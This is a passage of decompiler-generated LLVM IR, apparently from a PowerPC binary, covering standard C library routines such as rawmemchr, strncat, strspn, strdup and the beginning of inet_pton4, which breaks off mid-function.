  %v2_100099f4 = inttoptr i32 %v1_100099f4 to i32*
  %v3_100099f4 = load i32, i32* %v2_100099f4, align 4
  %v2_100099f8 = load i32, i32* %arg2, align 4
  %v1_100099fc = add i32 %tmp, 4
  %v2_100099fc = inttoptr i32 %v1_100099fc to i32*
  %v3_100099fc = load i32, i32* %v2_100099fc, align 4
  store i32 268474884, i32* @lr, align 4
  %v4_10009a00 = call i32 @__libc_lseek64(i32 %v3_100099f4, i32 %v2_100099f8, i32 %v3_100099fc, i32 %arg3)
  %v1_10009a04 = icmp slt i32 %v4_10009a00, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10009a04, label %dec_label_pc_10009a1c, label %dec_label_pc_10009a10

dec_label_pc_10009a10:                            ; preds = %entry
  %v1_10009a10 = load i32, i32* @r31, align 4
  %v2_10009a10 = inttoptr i32 %v1_10009a10 to i32*
  store i32 %v4_10009a00, i32* %v2_10009a10, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10009a18 = load i32, i32* @r31, align 4
  %v2_10009a18 = add i32 %v1_10009a18, 4
  %v3_10009a18 = inttoptr i32 %v2_10009a18 to i32*
  store i32 %tmp, i32* %v3_10009a18, align 4
  %v0_10009a1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10009a1c

dec_label_pc_10009a1c:                            ; preds = %entry, %dec_label_pc_10009a10
  %v0_10009a1c = phi i32 [ %tmp, %entry ], [ %v0_10009a1c.pre, %dec_label_pc_10009a10 ]
  store i32 %v0_100099dc, i32* %r0.global-to-local, align 4
  store i32 %v0_100099e8, i32* @r31, align 4
  ret i32 %v0_10009a1c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10009a1c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10009a34 = urem i32 %arg1, 256
  store i32 %v1_10009a34, i32* %r4.global-to-local, align 4
  %v0_10009a4c1 = load i32, i32* @r3, align 4
  %v1_10009a4c2 = urem i32 %v0_10009a4c1, 4
  %v3_10009a4c4 = icmp eq i32 %v1_10009a4c2, 0
  br i1 %v3_10009a4c4, label %dec_label_pc_10009a54, label %dec_label_pc_10009a3c

dec_label_pc_10009a3c:                            ; preds = %entry, %dec_label_pc_10009a3c
  %v1_10009a40 = phi i32 [ %v0_10009a54.pre, %dec_label_pc_10009a3c ], [ %v1_10009a34, %entry ]
  %v0_10009a3c = phi i32 [ %v1_10009a48, %dec_label_pc_10009a3c ], [ %v0_10009a4c1, %entry ]
  %v1_10009a3c = inttoptr i32 %v0_10009a3c to i8*
  %v2_10009a3c = load i8, i8* %v1_10009a3c, align 1
  %v3_10009a3c = zext i8 %v2_10009a3c to i32
  %v4_10009a40 = icmp eq i32 %v3_10009a3c, %v1_10009a40
  %v0_10009a44 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10009a40, i32 %v0_10009a44)
  %v0_10009a48 = load i32, i32* @r3, align 4
  %v1_10009a48 = add i32 %v0_10009a48, 1
  store i32 %v1_10009a48, i32* @r3, align 4
  %v1_10009a4c = urem i32 %v1_10009a48, 4
  %v3_10009a4c = icmp eq i32 %v1_10009a4c, 0
  %v0_10009a54.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10009a4c, label %dec_label_pc_10009a54, label %dec_label_pc_10009a3c

dec_label_pc_10009a54:                            ; preds = %dec_label_pc_10009a3c, %entry
  %v0_10009a6c9 = phi i32 [ %v0_10009a4c1, %entry ], [ %v1_10009a48, %dec_label_pc_10009a3c ]
  %v0_10009a54 = phi i32 [ %v1_10009a34, %entry ], [ %v0_10009a54.pre, %dec_label_pc_10009a3c ]
  %v1_10009a54 = mul i32 %v0_10009a54, 256
  %v2_10009a5c = or i32 %v1_10009a54, %v0_10009a54
  %v1_10009a64 = mul i32 %v2_10009a5c, 65536
  %v2_10009a68 = or i32 %v1_10009a64, %v2_10009a5c
  br label %dec_label_pc_10009a6c

dec_label_pc_10009a6c:                            ; preds = %dec_label_pc_10009ad8, %dec_label_pc_10009a6c, %dec_label_pc_10009a54
  %v0_10009aa8 = phi i32 [ %v0_10009a6c9, %dec_label_pc_10009a54 ], [ %v1_10009a70, %dec_label_pc_10009a6c ], [ %v1_10009a70, %dec_label_pc_10009ad8 ]
  %v1_10009a6c = inttoptr i32 %v0_10009aa8 to i32*
  %v2_10009a6c = load i32, i32* %v1_10009a6c, align 4
  %v1_10009a70 = add i32 %v0_10009aa8, 4
  %v1_10009a74 = add i32 %v0_10009aa8, 2
  %v2_10009a78 = xor i32 %v2_10009a6c, %v2_10009a68
  %v1_10009a80 = add i32 %v2_10009a78, 2130640639
  %v2_10009a84 = xor i32 %v1_10009a80, %v2_10009a78
  %v1_10009a88 = add i32 %v0_10009aa8, 1
  %v2_10009a8c = and i32 %v2_10009a84, -2130640640
  %v6_10009a8c = icmp eq i32 %v2_10009a8c, -2130640640
  br i1 %v6_10009a8c, label %dec_label_pc_10009a6c, label %dec_label_pc_10009a98

dec_label_pc_10009a98:                            ; preds = %dec_label_pc_10009a6c
  %v2_10009a98 = inttoptr i32 %v0_10009aa8 to i8*
  %v3_10009a98 = load i8, i8* %v2_10009a98, align 1
  %v4_10009a98 = zext i8 %v3_10009a98 to i32
  %v1_10009a9c = add i32 %v0_10009aa8, 3
  %v4_10009aa0 = icmp eq i32 %v4_10009a98, %v0_10009a54
  br i1 %v4_10009aa0, label %dec_label_pc_10009aa8, label %dec_label_pc_10009ab0

dec_label_pc_10009aa8:                            ; preds = %dec_label_pc_10009a98
  ret i32 %v0_10009aa8

dec_label_pc_10009ab0:                            ; preds = %dec_label_pc_10009a98
  %v2_10009ab0 = inttoptr i32 %v1_10009a88 to i8*
  %v3_10009ab0 = load i8, i8* %v2_10009ab0, align 1
  %v4_10009ab0 = zext i8 %v3_10009ab0 to i32
  %v4_10009ab4 = icmp eq i32 %v4_10009ab0, %v0_10009a54
  br i1 %v4_10009ab4, label %dec_label_pc_10009abc, label %dec_label_pc_10009ac4

dec_label_pc_10009abc:                            ; preds = %dec_label_pc_10009ab0
  ret i32 %v1_10009a88

dec_label_pc_10009ac4:                            ; preds = %dec_label_pc_10009ab0
  %v2_10009ac4 = inttoptr i32 %v1_10009a74 to i8*
  %v3_10009ac4 = load i8, i8* %v2_10009ac4, align 1
  %v4_10009ac4 = zext i8 %v3_10009ac4 to i32
  %v4_10009ac8 = icmp eq i32 %v4_10009ac4, %v0_10009a54
  br i1 %v4_10009ac8, label %dec_label_pc_10009ad0, label %dec_label_pc_10009ad8

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009ac4
  ret i32 %v1_10009a74

dec_label_pc_10009ad8:                            ; preds = %dec_label_pc_10009ac4
  %v2_10009ad8 = inttoptr i32 %v1_10009a9c to i8*
  %v3_10009ad8 = load i8, i8* %v2_10009ad8, align 1
  %v4_10009ad8 = zext i8 %v3_10009ad8 to i32
  %v4_10009adc = icmp eq i32 %v4_10009ad8, %v0_10009a54
  br i1 %v4_10009adc, label %dec_label_pc_10009ae4, label %dec_label_pc_10009a6c

dec_label_pc_10009ae4:                            ; preds = %dec_label_pc_10009ad8
  ret i32 %v1_10009a9c

; uselistorder directives
  uselistorder i32 %v1_10009a70, { 1, 0 }
  uselistorder i32 %v0_10009aa8, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_10009a5c, { 1, 0 }
  uselistorder i32 %v0_10009a54, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10009a48, { 1, 0, 3, 2 }
  uselistorder i32 %v0_10009a4c1, { 2, 1, 0 }
  uselistorder i32 %v1_10009a34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009a3c, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009af0

dec_label_pc_10009af0:                            ; preds = %dec_label_pc_10009af0, %entry
  %v0_10009af0 = phi i32 [ %v1_10009af4, %dec_label_pc_10009af0 ], [ %tmp, %entry ]
  %v1_10009af0 = inttoptr i32 %v0_10009af0 to i8*
  %v2_10009af0 = load i8, i8* %v1_10009af0, align 1
  %v1_10009af4 = add i32 %v0_10009af0, 1
  store i32 %v1_10009af4, i32* %r11.global-to-local, align 4
  %v3_10009af8 = icmp eq i8 %v2_10009af0, 0
  store i1 %v3_10009af8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009af8, label %dec_label_pc_10009b00, label %dec_label_pc_10009af0

dec_label_pc_10009b00:                            ; preds = %dec_label_pc_10009af0
  %v3_10009b00 = icmp eq i32 %arg2, 3
  store i1 %v3_10009b00, i1* %cr7_eq.global-to-local, align 1
  %v1_10009b04 = add i32 %v0_10009af0, -1
  store i32 %v1_10009b04, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_10009ba0, label %dec_label_pc_10009b10

dec_label_pc_10009b10:                            ; preds = %dec_label_pc_10009b00
  %v1_10009b10 = udiv i32 %arg2, 4
  store i32 %v1_10009b10, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009b18

dec_label_pc_10009b18:                            ; preds = %dec_label_pc_10009b18.dec_label_pc_10009b18_crit_edge, %dec_label_pc_10009b10
  %v2_10009b28 = phi i32 [ %v0_10009b1c.pre, %dec_label_pc_10009b18.dec_label_pc_10009b18_crit_edge ], [ %v1_10009b04, %dec_label_pc_10009b10 ]
  %v0_10009b18 = load i32, i32* @r4, align 4
  %v1_10009b18 = inttoptr i32 %v0_10009b18 to i8*
  %v2_10009b18 = load i8, i8* %v1_10009b18, align 1
  %v1_10009b1c = add i32 %v2_10009b28, 1
  store i32 %v1_10009b1c, i32* %r9.global-to-local, align 4
  %v1_10009b20 = add i32 %v2_10009b28, 2
  store i32 %v1_10009b20, i32* %r7.global-to-local, align 4
  %v3_10009b24 = icmp eq i8 %v2_10009b18, 0
  store i1 %v3_10009b24, i1* %cr7_eq.global-to-local, align 1
  %v4_10009b28 = inttoptr i32 %v1_10009b1c to i8*
  store i8 %v2_10009b18, i8* %v4_10009b28, align 1
  %v0_10009b2c = load i32, i32* @r4, align 4
  %v1_10009b2c = add i32 %v0_10009b2c, 1
  store i32 %v1_10009b2c, i32* %r11.global-to-local, align 4
  %v0_10009b30 = load i32, i32* @lr, align 4
  %v1_10009b30 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b30, i32 %v0_10009b30)
  %v0_10009b34 = load i32, i32* @r4, align 4
  %v1_10009b34 = add i32 %v0_10009b34, 1
  %v2_10009b34 = inttoptr i32 %v1_10009b34 to i8*
  %v3_10009b34 = load i8, i8* %v2_10009b34, align 1
  %v0_10009b38 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009b38 = add i32 %v0_10009b38, 1
  store i32 %v1_10009b38, i32* %r8.global-to-local, align 4
  %v0_10009b3c = load i32, i32* %r7.global-to-local, align 4
  %v1_10009b3c = add i32 %v0_10009b3c, 1
  store i32 %v1_10009b3c, i32* %r10.global-to-local, align 4
  %v3_10009b40 = icmp eq i8 %v3_10009b34, 0
  store i1 %v3_10009b40, i1* %cr7_eq.global-to-local, align 1
  %v2_10009b44 = load i32, i32* %r9.global-to-local, align 4
  %v3_10009b44 = add i32 %v2_10009b44, 1
  %v4_10009b44 = inttoptr i32 %v3_10009b44 to i8*
  store i8 %v3_10009b34, i8* %v4_10009b44, align 1
  %v0_10009b48 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009b48 = add i32 %v0_10009b48, 1
  store i32 %v1_10009b48, i32* %r9.global-to-local, align 4
  %v1_10009b4c = add i32 %v0_10009b48, 2
  store i32 %v1_10009b4c, i32* @r4, align 4
  %v0_10009b50 = load i32, i32* @lr, align 4
  %v1_10009b50 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b50, i32 %v0_10009b50)
  %v0_10009b54 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009b54 = add i32 %v0_10009b54, 1
  %v2_10009b54 = inttoptr i32 %v1_10009b54 to i8*
  %v3_10009b54 = load i8, i8* %v2_10009b54, align 1
  %v0_10009b58 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009b58 = add i32 %v0_10009b58, 1
  store i32 %v1_10009b58, i32* %r11.global-to-local, align 4
  %v3_10009b5c = icmp eq i8 %v3_10009b54, 0
  store i1 %v3_10009b5c, i1* %cr7_eq.global-to-local, align 1
  %v2_10009b60 = load i32, i32* %r7.global-to-local, align 4
  %v3_10009b60 = add i32 %v2_10009b60, 1
  %v4_10009b60 = inttoptr i32 %v3_10009b60 to i8*
  store i8 %v3_10009b54, i8* %v4_10009b60, align 1
  %v0_10009b64 = load i32, i32* @lr, align 4
  %v1_10009b64 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b64, i32 %v0_10009b64)
  %v0_10009b68 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009b68 = add i32 %v0_10009b68, 1
  %v2_10009b68 = inttoptr i32 %v1_10009b68 to i8*
  %v3_10009b68 = load i8, i8* %v2_10009b68, align 1
  %v4_10009b68 = zext i8 %v3_10009b68 to i32
  store i32 %v4_10009b68, i32* %r9.global-to-local, align 4
  %v3_10009b6c = icmp eq i8 %v3_10009b68, 0
  store i1 %v3_10009b6c, i1* %cr7_eq.global-to-local, align 1
  %v2_10009b70 = load i32, i32* %r10.global-to-local, align 4
  %v3_10009b70 = add i32 %v2_10009b70, 1
  %v4_10009b70 = inttoptr i32 %v3_10009b70 to i8*
  store i8 %v3_10009b68, i8* %v4_10009b70, align 1
  %v0_10009b74 = load i32, i32* @lr, align 4
  %v1_10009b74 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b74, i32 %v0_10009b74)
  %v0_10009b78 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009b78 = add i32 %v0_10009b78, -1
  store i32 %v1_10009b78, i32* %ctr.global-to-local, align 4
  %v2_10009b78 = icmp eq i32 %v1_10009b78, 0
  br i1 %v2_10009b78, label %dec_label_pc_10009b7c, label %dec_label_pc_10009b18.dec_label_pc_10009b18_crit_edge

dec_label_pc_10009b18.dec_label_pc_10009b18_crit_edge: ; preds = %dec_label_pc_10009b18
  %v0_10009b1c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009b18

dec_label_pc_10009b7c:                            ; preds = %dec_label_pc_10009b18
  %v0_10009b7c = load i32, i32* %r5.global-to-local, align 4
  %v1_10009b7c = urem i32 %v0_10009b7c, 4
  store i32 %v1_10009b7c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009ba0

dec_label_pc_10009b84:                            ; preds = %dec_label_pc_10009ba0, %dec_label_pc_10009b84.dec_label_pc_10009b84_crit_edge
  %v0_10009b88 = phi i32 [ %v0_10009b88.pre, %dec_label_pc_10009b84.dec_label_pc_10009b84_crit_edge ], [ %v0_10009ba0, %dec_label_pc_10009ba0 ]
  %v0_10009b84 = load i32, i32* @r4, align 4
  %v1_10009b84 = inttoptr i32 %v0_10009b84 to i8*
  %v2_10009b84 = load i8, i8* %v1_10009b84, align 1
  %v3_10009b84 = zext i8 %v2_10009b84 to i32
  store i32 %v3_10009b84, i32* %r9.global-to-local, align 4
  %v1_10009b88 = add i32 %v0_10009b88, -1
  store i32 %v1_10009b88, i32* %r5.global-to-local, align 4
  %v1_10009b8c = add i32 %v0_10009b84, 1
  store i32 %v1_10009b8c, i32* @r4, align 4
  %v3_10009b90 = icmp eq i8 %v2_10009b84, 0
  store i1 %v3_10009b90, i1* %cr7_eq.global-to-local, align 1
  %v2_10009b94 = load i32, i32* %r11.global-to-local, align 4
  %v3_10009b94 = add i32 %v2_10009b94, 1
  %v4_10009b94 = inttoptr i32 %v3_10009b94 to i8*
  store i8 %v2_10009b84, i8* %v4_10009b94, align 1
  store i32 %v3_10009b94, i32* %r11.global-to-local, align 4
  %v0_10009b98 = load i32, i32* @lr, align 4
  %v1_10009b98 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b98, i32 %v0_10009b98)
  %v0_10009ba8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009ba8 = add i32 %v0_10009ba8, -1
  store i32 %v1_10009ba8, i32* %ctr.global-to-local, align 4
  %v2_10009ba8 = icmp eq i32 %v1_10009ba8, 0
  br i1 %v2_10009ba8, label %dec_label_pc_10009bac, label %dec_label_pc_10009b84.dec_label_pc_10009b84_crit_edge

dec_label_pc_10009b84.dec_label_pc_10009b84_crit_edge: ; preds = %dec_label_pc_10009b84
  %v0_10009b88.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009b84

dec_label_pc_10009ba0:                            ; preds = %dec_label_pc_10009b00, %dec_label_pc_10009b7c
  %v0_10009ba0 = phi i32 [ %arg2, %dec_label_pc_10009b00 ], [ %v1_10009b7c, %dec_label_pc_10009b7c ]
  store i32 %v0_10009ba0, i32* %ctr.global-to-local, align 4
  %v2_10009ba83 = icmp eq i32 %v0_10009ba0, 0
  br i1 %v2_10009ba83, label %dec_label_pc_10009bac, label %dec_label_pc_10009b84

dec_label_pc_10009bac:                            ; preds = %dec_label_pc_10009b84, %dec_label_pc_10009ba0
  %v0_10009bac = load i32, i32* %r9.global-to-local, align 4
  %v3_10009bac = icmp eq i32 %v0_10009bac, 0
  store i1 %v3_10009bac, i1* %cr7_eq.global-to-local, align 1
  %v0_10009bb0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009bac, i32 %v0_10009bb0)
  %v0_10009bb4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009bb4 = trunc i32 %v0_10009bb4 to i8
  %v2_10009bb4 = load i32, i32* %r11.global-to-local, align 4
  %v3_10009bb4 = add i32 %v2_10009bb4, 1
  %v4_10009bb4 = inttoptr i32 %v3_10009bb4 to i8*
  store i8 %v1_10009bb4, i8* %v4_10009bb4, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_10009ba0, { 1, 2, 0 }
  uselistorder i32 %v1_10009ba8, { 1, 0 }
  uselistorder i32 %v1_10009b7c, { 1, 0 }
  uselistorder i32 %v1_10009b78, { 1, 0 }
  uselistorder i32 %v2_10009b28, { 1, 0 }
  uselistorder i32 %v1_10009af4, { 1, 0 }
  uselistorder i32 %v0_10009af0, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10009bac, { 1, 0 }
  uselistorder label %dec_label_pc_10009ba0, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10009bec1 = load i32, i32* @r3, align 4
  %v1_10009bec2 = inttoptr i32 %v0_10009bec1 to i8*
  %v2_10009bec3 = load i8, i8* %v1_10009bec2, align 1
  %v3_10009bf06 = icmp eq i8 %v2_10009bec3, 0
  br i1 %v3_10009bf06, label %dec_label_pc_10009c00, label %dec_label_pc_10009bf8

dec_label_pc_10009bc8:                            ; preds = %dec_label_pc_10009bc8, %dec_label_pc_10009bf8
  %v0_10009bc8 = phi i32 [ %v1_10009bcc, %dec_label_pc_10009bc8 ], [ %tmp, %dec_label_pc_10009bf8 ]
  %v1_10009bc8 = inttoptr i32 %v0_10009bc8 to i8*
  %v2_10009bc8 = load i8, i8* %v1_10009bc8, align 1
  %v1_10009bcc = add i32 %v0_10009bc8, 1
  %v3_10009bd0 = icmp eq i8 %v2_10009bc8, 0
  %v4_10009bd4 = icmp eq i8 %v0_10009bd48.in, %v2_10009bc8
  %brmerge = or i1 %v3_10009bd0, %v4_10009bd4
  br i1 %brmerge, label %dec_label_pc_10009bdc, label %dec_label_pc_10009bc8

dec_label_pc_10009bdc:                            ; preds = %dec_label_pc_10009bc8
  br i1 %v3_10009bd0, label %dec_label_pc_10009c00, label %dec_label_pc_10009be4

dec_label_pc_10009be4:                            ; preds = %dec_label_pc_10009bdc
  %v1_10009be4 = add i32 %v0_10009be4, 1
  %v1_10009be8 = add i32 %v0_10009be8, 1
  %v1_10009bec = inttoptr i32 %v1_10009be8 to i8*
  %v2_10009bec = load i8, i8* %v1_10009bec, align 1
  %v3_10009bf0 = icmp eq i8 %v2_10009bec, 0
  br i1 %v3_10009bf0, label %dec_label_pc_10009c00, label %dec_label_pc_10009bf8

dec_label_pc_10009bf8:                            ; preds = %entry, %dec_label_pc_10009be4
  %v0_10009be8 = phi i32 [ %v1_10009be8, %dec_label_pc_10009be4 ], [ %v0_10009bec1, %entry ]
  %v0_10009be4 = phi i32 [ %v1_10009be4, %dec_label_pc_10009be4 ], [ 0, %entry ]
  %v0_10009bd48.in = phi i8 [ %v2_10009bec, %dec_label_pc_10009be4 ], [ %v2_10009bec3, %entry ]
  br label %dec_label_pc_10009bc8

dec_label_pc_10009c00:                            ; preds = %dec_label_pc_10009be4, %dec_label_pc_10009bdc, %entry
  %v0_10009c00 = phi i32 [ 0, %entry ], [ %v1_10009be4, %dec_label_pc_10009be4 ], [ %v0_10009be4, %dec_label_pc_10009bdc ]
  ret i32 %v0_10009c00

; uselistorder directives
  uselistorder i32 %v0_10009bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10009bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10009bc8, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10009c1c = call i32 @__GI_strlen()
  %v1_10009c20 = add i32 %v0_10009c1c, 1
  store i32 %v1_10009c20, i32* @r29, align 4
  store i32 %v1_10009c20, i32* @r3, align 4
  store i32 268475436, i32* @lr, align 4
  %v0_10009c28 = call i32 @malloc()
  store i32 %v0_10009c28, i32* @r3, align 4
  %v0_10009c2c = load i32, i32* @r28, align 4
  store i32 %v0_10009c2c, i32* @r4, align 4
  store i32 %v0_10009c28, i32* @r31, align 4
  %v3_10009c30 = icmp eq i32 %v0_10009c28, 0
  %v0_10009c34 = load i32, i32* @r29, align 4
  store i32 %v0_10009c34, i32* @r5, align 4
  br i1 %v3_10009c30, label %dec_label_pc_10009c40, label %dec_label_pc_10009c3c

dec_label_pc_10009c3c:                            ; preds = %entry
  store i32 268475456, i32* @lr, align 4
  %v0_10009c3c = call i32 @memcpy()
  %v0_10009c44.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009c40

dec_label_pc_10009c40:                            ; preds = %entry, %dec_label_pc_10009c3c
  %v0_10009c44 = phi i32 [ 0, %entry ], [ %v0_10009c44.pre, %dec_label_pc_10009c3c ]
  ret i32 %v0_10009c44

; uselistorder directives
  uselistorder i32 ()* @malloc, { 5, 2, 1, 12, 11, 4, 3, 10, 9, 8, 0, 7, 6 }
  uselistorder label %dec_label_pc_10009c40, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10009c58 = load i32, i32* @lr, align 4
  store i32 %v0_10009c58, i32* %r0.global-to-local, align 4
  %v0_10009c60 = call i32 @__asm_mfcr()
  store i32 %v0_10009c60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10009c6c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009c6c, i32* %r7.global-to-local, align 4
  %v0_10009c70 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10009cd8

dec_label_pc_10009c88:                            ; preds = %dec_label_pc_10009cd8
  %v3_10009c88 = icmp eq i32 %v0_10009cfc, 4
  store i1 %v3_10009c88, i1* %cr7_eq.global-to-local, align 1
  %v0_10009c8c = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10009c8c, label %dec_label_pc_10009cc4, label %dec_label_pc_10009c90

dec_label_pc_10009c90:                            ; preds = %dec_label_pc_10009c88
  %v0_10009c90 = load i32, i32* %r7.global-to-local, align 4
  %v1_10009c90 = inttoptr i32 %v0_10009c90 to i8*
  %v2_10009c90 = load i8, i8* %v1_10009c90, align 1
  %v3_10009c90 = zext i8 %v2_10009c90 to i32
  %v1_10009c94 = mul nuw nsw i32 %v3_10009c90, 10
  %v1_10009c98 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009c98 = add i32 %v1_10009c94, %v1_10009c98
  %v1_10009c9c = add i32 %v2_10009c98, -48
  store i32 %v1_10009c9c, i32* %r0.global-to-local, align 4
  %v2_10009ca0 = icmp ugt i32 %v1_10009c9c, 255
  %v3_10009ca0 = icmp eq i32 %v1_10009c9c, 255
  store i1 %v3_10009ca0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10009ca0, label %dec_label_pc_10009d20, label %dec_label_pc_10009ca8

dec_label_pc_10009ca8:                            ; preds = %dec_label_pc_10009c90
  %v1_10009ca8 = trunc i32 %v1_10009c9c to i8
  store i8 %v1_10009ca8, i8* %v1_10009c90, align 1
  %v0_10009cac = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009cac, label %dec_label_pc_10009cb0, label %dec_label_pc_10009cd8.backedge

dec_label_pc_10009cb0:                            ; preds = %dec_label_pc_10009ca8
  %v0_10009cb0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009cb0 = add i32 %v0_10009cb0, 1
  store i32 %v1_10009cb0, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_10009cb8 = icmp sgt i32 %v1_10009cb0, 4
  %v3_10009cb8 = icmp eq i32 %v1_10009cb0, 4
  store i1 %v3_10009cb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10009cb8, label %dec_label_pc_10009d20, label %dec_label_pc_10009cd8.backedge

dec_label_pc_10009cc4:                            ; preds = %dec_label_pc_10009c88
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10009cc8 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_10009cc8.not = xor i1 %v0_10009cc8, true
  %v0_10009ccc = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10009c88, %v0_10009ccc
  %or.cond = or i1 %brmerge, %v0_10009cc8.not
  br i1 %or.cond, label %dec_label_pc_10009d20, label %dec_label_pc_10009cd4

dec_label_pc_10009cd4:                            ; preds = %dec_label_pc_10009cc4
  %v0_10009cd4 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009cd4 = trunc i32 %v0_10009cd4 to i8
  %v2_10009cd4 = load i32, i32* %r7.global-to-local, align 4
  %v3_10009cd4 = add i32 %v2_10009cd4, 1
  %v4_10009cd4 = inttoptr i32 %v3_10009cd4 to i8*
  store i8 %v1_10009cd4, i8* %v4_10009cd4, align 1
  store i32 %v3_10009cd4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10009cd8.backedge

dec_label_pc_10009cd8.backedge:                   ; preds = %dec_label_pc_10009cd4, %dec_label_pc_10009ca8, %dec_label_pc_10009cb0
  %v0_10009cd8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10009cdc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10009cd8

dec_label_pc_10009cd8:                            ; preds = %dec_label_pc_10009cd8.backedge, %entry
  %v0_10009cdc = phi i32 [ %v0_10009cdc.pre, %dec_label_pc_10009cd8.backedge ], [ 0, %entry ]
  %v0_10009ce0 = phi i32 [ %v0_10009cd8.pre, %dec_label_pc_10009cd8.backedge ], [ %v0_10009c60, %entry ]
  %v1_10009cd8 = inttoptr i32 %v0_10009ce0 to i8*
